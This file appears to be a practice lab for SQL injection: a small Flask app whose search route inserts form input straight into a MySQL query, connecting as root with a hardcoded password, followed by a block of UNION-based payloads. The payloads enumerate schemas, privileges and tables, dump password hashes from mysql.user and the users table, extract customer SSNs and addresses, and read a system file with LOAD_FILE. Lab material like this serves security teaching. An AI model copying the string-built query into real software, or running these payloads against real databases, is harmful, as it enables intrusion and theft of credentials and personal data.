from flask import Flask, render_template, request
from flask_bootstrap import Bootstrap
from sqlalchemy import create_engine, text
import os

app = Flask(__name__)
Bootstrap(app)
app.config['BOOTSTRAP_SERVE_LOCAL'] = True
db_engine = create_engine(f"mysql+pymysql://root:password@{os.getenv('DB_HOST', 'localhost')}/dummy_db")


@app.route('/', methods=["GET"])
def main():
    return render_template('index.html')


@app.route('/union-sqli', methods=["GET"])
def get_union_sqli():
    return render_template('union_sqli_form.html')


@app.route('/union-sqli', methods=["POST"])
def post_union_sqli():
    req = request
    search = req.form['name']

    with db_engine.connect() as con:
        rs = con.execute(text(f"SELECT * FROM apps WHERE name like '%{search}%'"))

    return render_template('union_sqli_form.html', search=search,  result=rs.fetchall())


if __name__ == "__main__":
    app.run()


"""
' AND 0 UNION SELECT 0, 1, 2, 3; -- 

' AND 0 UNION SELECT 0, user(), database(), @@version; -- x

' AND 0 UNION SELECT 0, schema_name, '', ''  FROM information_schema.schemata; -- x

' AND 0 UNION SELECT 0, GRANTEE,  PRIVILEGE_TYPE, IS_GRANTABLE FROM information_schema.USER_PRIVILEGES; -- x

' AND 0 UNION SELECT 0, user, host, CURRENT_CONNECTIONS FROM performance_schema.accounts; -- x
 
' AND 0 UNION SELECT 0, table_name, table_rows, '' FROM information_schema.tables WHERE table_schema = "dummy_db"; -- x

' AND 0 UNION SELECT 0, column_name, data_type, '' FROM information_schema.columns WHERE table_schema = "dummy_db"; -- x

' AND 0 UNION SELECT 0, column_name, data_type, '' FROM information_schema.columns WHERE table_schema = "dummy_db" AND table_name = "users"; -- x

' AND 0 UNION SELECT 0, Host, User, authentication_string FROM mysql.user; -- x

' AND 0 UNION SELECT 0, username, email, password FROM users; -- x

' AND 0 UNION SELECT 0, column_name, data_type, '' FROM information_schema.columns WHERE table_schema = "dummy_db" AND table_name = "customers"; -- x

' AND 0 UNION SELECT 0, 0, 0, CONCAT_WS(" | ", id, name, company, department, job, ssn, phone, address, city, country) FROM customers; -- x

' AND 0 UNION SELECT 0, @@GLOBAL.secure_file_priv, @@max_allowed_packet, '' FROM customers; -- x

' AND 0 UNION SELECT 0, LOAD_FILE('/etc/security/access.conf'), '', '' FROM customers; -- x
"""